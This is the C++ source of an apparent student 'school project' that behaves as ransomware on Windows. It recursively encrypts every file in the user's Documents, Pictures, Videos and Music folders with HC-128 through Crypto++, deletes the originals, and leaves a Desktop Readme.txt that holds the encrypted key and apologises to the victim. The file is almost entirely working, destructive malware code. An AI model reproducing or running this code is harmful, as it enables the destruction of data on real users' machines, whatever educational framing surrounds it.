#include <iostream>
#include <string>
#include <direct.h>
#include <fstream>
#include <filesystem>
#include <vector>
//a bunch of different imports rather than importing everything
//everything needed is imported, nothing more
#include "./../cryptopp/hc128.h"
#include "./../cryptopp/secblock.h"
#include "./../cryptopp/osrng.h"
#include "./../cryptopp/filters.h"
#include "./../cryptopp/cryptlib.h"
#include "./../cryptopp/modes.h"
//for testing runtime of function
#include <chrono>


using namespace std;

//Custom structure becuase the size is important
//this is much easier than trying to keep track of 2 values
struct customCharStar {
	char* data;
	int size;
};

string charStarToString(char*);
bool makeDirectory(string, string);
//does what the functions say they do
customCharStar encryptData(customCharStar, vector<CryptoPP::SecByteBlock>);
customCharStar decryptData(customCharStar, vector<CryptoPP::SecByteBlock>);
//saves any data to a file as long as it uses customCharStar
void saveDataToFile(string, customCharStar);
//reads the data from files
customCharStar readDataFromFile(string);
//makes and reads the key
vector<CryptoPP::SecByteBlock> readKeyIVFromFile(string);
vector<CryptoPP::SecByteBlock> generateKeyIVVector();
//function for saving the key so it can be decrypted
void saveKeyIVToFile(string, vector<CryptoPP::SecByteBlock>);
vector<filesystem::directory_entry> getAllFilesInDirectory(string);
//function that encrypts all files in a given vector
void encryptAllFilesInVector(vector<CryptoPP::SecByteBlock>, vector<vector<filesystem::directory_entry>>);
void createDecryptionFile(string, vector<CryptoPP::SecByteBlock>);


int main() {
	char* userProfile = getenv("USERPROFILE");
	string testFolderLocation = "testFolder";
	string fileLocation = charStarToString(userProfile) + "\\Desktop\\";
	string currUserProfile = charStarToString(userProfile);

	//written with help from https://www.cryptopp.com/wiki/HC-128
	//^^ is the documention for cpypto++ a cryptography library for c++
	//vector<CryptoPP::SecByteBlock> keyVector = readKeyIVFromFile("KeysAreHere.txt");
	vector<CryptoPP::SecByteBlock> keyVector = generateKeyIVVector();
	//saveKeyIVToFile("Keys.txt", keyVector);
	createDecryptionFile("Readme.txt", keyVector);

	//create file for giving the keys to decrypt their files

	//No need to encrypt everyting, just what would be important to people
	//can be changed later if necessary
	//also push them to the main vector
	vector<vector<filesystem::directory_entry>> allFilesVector = vector<vector<filesystem::directory_entry>>();
	//documents
	allFilesVector.push_back(getAllFilesInDirectory(currUserProfile + "\\Documents\\"));
	//pictures
	allFilesVector.push_back(getAllFilesInDirectory(currUserProfile + "\\Pictures\\"));
	//videos
	allFilesVector.push_back(getAllFilesInDirectory(currUserProfile + "\\Videos\\"));
	//music
	allFilesVector.push_back(getAllFilesInDirectory(currUserProfile + "\\Music\\"));

	//encrypt it all!
	encryptAllFilesInVector(keyVector, allFilesVector);
}

void createDecryptionFile(string outFileName, vector<CryptoPP::SecByteBlock> keyVector) {
	ofstream outFile;
	//put the file on the desktop
	char* userProfile = getenv("USERPROFILE");
	string desktopLocation = charStarToString(userProfile) + "\\Desktop\\";

	//make the file on the desktop
	outFile.open(desktopLocation + outFileName);
	vector<CryptoPP::SecByteBlock> newKeyVector = generateKeyIVVector();

	//encrypt the key/iv and save it to the file
	for (CryptoPP::SecByteBlock item : keyVector) {
		//encrypt the key and iv
		customCharStar temp;
		temp.data = (char*)item.data();
		temp.size = item.size();
		temp = encryptData(temp, newKeyVector);
		outFile << temp.data << "\n";
	}
	//create some space
	outFile << endl << endl;

	//add information to the file for how to decrypt it.

	outFile << "This program was created as a school project." << endl;
	outFile << "Sorry that you have enountered it. It was made" << endl;
	outFile << "for education purposes only." << endl;
	outFile << "Your files are encrypted using HC128 encryption." << endl;
	outFile << "https://www.ecrypt.eu.org/stream/p3ciphers/hc/hc128_p3.pdf" << endl;
	outFile << "The first line is the key value and the second line is the IV" << endl;
	outFile << "Decrypt those two lines using the next given key and IV using HC128" << endl;
	outFile << "That will give you your file's key and IV which will allow you to decrypt them." << endl;
	outFile << "Non encrypted key: " << newKeyVector[0] << endl;
	outFile << "Non encrypted IV: " << newKeyVector[1] << endl;
	outFile << "Goodluck and have a nice day! :) ~ Group 7." << endl;

	outFile.close();
}

vector<CryptoPP::SecByteBlock> generateKeyIVVector() {
	vector<CryptoPP::SecByteBlock> returnVec = vector<CryptoPP::SecByteBlock>();

	//create the correctly sized key and iv
	CryptoPP::SecByteBlock key(16), iv(16);
	//create the random seed pool for creating the key and iv
	CryptoPP::AutoSeededRandomPool prng;
	//create both the key and iv
	prng.GenerateBlock(key, key.size());
	prng.GenerateBlock(iv, iv.size());
	returnVec.push_back(key);
	returnVec.push_back(iv);

	return returnVec;
}

//method used for converting the char* envVar to a string so I can work with it
string charStarToString(char* input) {
	string returnString = "";
	char* loopPtr = input;
	for (char currentChar = *loopPtr; currentChar; currentChar = *++loopPtr) {
		returnString += currentChar;
	}

	return returnString;
}

//easy to make a method to handle this instead of ocnstantly writing two lines of code
bool makeDirectory(string location, string newFolderName) {
	string wholeDirString = location + "\\" + newFolderName;
	return _mkdir(wholeDirString.c_str());
}

void saveKeyIVToFile(string outFileName, vector<CryptoPP::SecByteBlock> keyVector) {
	ofstream outFile;
	outFile.open(outFileName);

	for (CryptoPP::SecByteBlock item : keyVector) {
		outFile << item << "\n";
	}

	outFile.close();
}

void saveDataToFile(string outFileName, customCharStar inputStruct) {
	std::ofstream outFile(outFileName, std::ifstream::binary);

	outFile.write(inputStruct.data, inputStruct.size);
	
	outFile.close();
}

customCharStar readDataFromFile(string fileName) {
	ifstream inputFile(fileName, std::ifstream::binary);
	if (inputFile) {
		//find the length of the file
		inputFile.seekg(0, inputFile.end);
		int length = inputFile.tellg();
		inputFile.seekg(0, inputFile.beg);

		char* buffer = new char[length];

		//read all the data
		inputFile.read(buffer, length);

		inputFile.close();

		//have to keep track of size
		customCharStar myStructure;
		myStructure.data = buffer;
		myStructure.size = length;

		return myStructure;
	}
}

vector<CryptoPP::SecByteBlock> readKeyIVFromFile(string fileName) {
	vector<CryptoPP::SecByteBlock> returnVec = vector<CryptoPP::SecByteBlock>();
	ifstream inFile;
	inFile.open(fileName);

	while (!inFile.eof()) {
		string temp;
		inFile >> temp;
		
		//don't grab garbage data
		if (!temp.empty()) {
			//make a new SecByteBlock based off the read string
			//essentialyl just takes the string and size of the string then creates a new SecByteBlock
			CryptoPP::SecByteBlock tempByte((const unsigned char*)(temp.data()), temp.size());
			returnVec.push_back(tempByte);
		}
	}

	inFile.close();

	return returnVec;
}

customCharStar decryptData(customCharStar inputData, vector<CryptoPP::SecByteBlock> keyVector) {
	customCharStar returnVal;
	//used for consistency across the program
	CryptoPP::SecByteBlock key = keyVector[0];
	CryptoPP::SecByteBlock iv = keyVector[1];

	//Creating the decryption object
	CryptoPP::HC128::Decryption decryptionObject;
	decryptionObject.SetKeyWithIV(key, key.size(), iv, iv.size());

	//creating buffers
	returnVal.size = inputData.size;
	returnVal.data = new char[inputData.size];
	std::memcpy(returnVal.data, inputData.data, inputData.size);

	//creating the filters and decrypting the data
	CryptoPP::StreamTransformationFilter decryptor(decryptionObject, nullptr);
	decryptor.Put(reinterpret_cast<const CryptoPP::byte*>(inputData.data), inputData.size);
	decryptor.MessageEnd();
	size_t decryptedSize = decryptor.MaxRetrievable();
	decryptor.Get(reinterpret_cast<CryptoPP::byte*>(returnVal.data), decryptedSize);

	return returnVal;
}

customCharStar encryptData(customCharStar inputData, vector<CryptoPP::SecByteBlock> keyVector) {
	customCharStar returnVal;
	//used for consistency across the program
	CryptoPP::SecByteBlock key = keyVector[0];
	CryptoPP::SecByteBlock iv = keyVector[1];

	//Creating the encryption object
	CryptoPP::HC128::Encryption encryptionObject;
	encryptionObject.SetKeyWithIV(key, key.size(), iv, iv.size());

	//creating buffers
	returnVal.size = inputData.size;
	returnVal.data = new char[inputData.size];
	std::memcpy(returnVal.data, inputData.data, inputData.size);

	//creating the filters and encrypting the data
	CryptoPP::StreamTransformationFilter encryptor(encryptionObject, nullptr);
	encryptor.Put(reinterpret_cast<const CryptoPP::byte*>(inputData.data), inputData.size);
	encryptor.MessageEnd();
	size_t encryptedSize = encryptor.MaxRetrievable();
	encryptor.Get(reinterpret_cast<CryptoPP::byte*>(returnVal.data), encryptedSize);

	return returnVal;
}

//function that returns all non directory files in a directory (recursively)
//Not necessarily in any order, but doesn't matter in this case
vector<filesystem::directory_entry> getAllFilesInDirectory(string startingDir) {
	vector<filesystem::directory_entry> returnVec = vector<filesystem::directory_entry>();
	for (const auto& entry : filesystem::recursive_directory_iterator(startingDir)) {
		//getting the current path
		filesystem::path currPath = entry;
		if (!filesystem::is_directory(currPath)) {
			returnVec.push_back(entry);
		}
	}

	return returnVec;
}

void encryptAllFilesInVector(vector<CryptoPP::SecByteBlock> keyVector, vector<vector<filesystem::directory_entry>> directoryVec) {
	//loop through each inner vector
	for (auto directoryVector : directoryVec) {
		//loop over each entry in the inner vector
		for (filesystem::directory_entry fileDirectoryEntry : directoryVector) {
			filesystem::path currPath = fileDirectoryEntry.path();
			//making the path a str so it can be worked with
			string currentFile = currPath.string();
			//gets the current extension
			string currentExt = currPath.extension().string();
			//gets the current file without extension
			string fileNoExt = currPath.replace_extension().string();

			cout << currentFile << endl;
			//avoid the desktop.ini files
			if (currentExt != ".ini") {
				//reading in the file
				customCharStar fileData = readDataFromFile(currentFile);
				//encrypting the file and saving it
				customCharStar encryptedData = encryptData(fileData, keyVector);
				saveDataToFile(fileNoExt + "ENC" + currentExt, encryptedData);
				//delete the file
				filesystem::remove(currentFile);
			}
		}
	}
}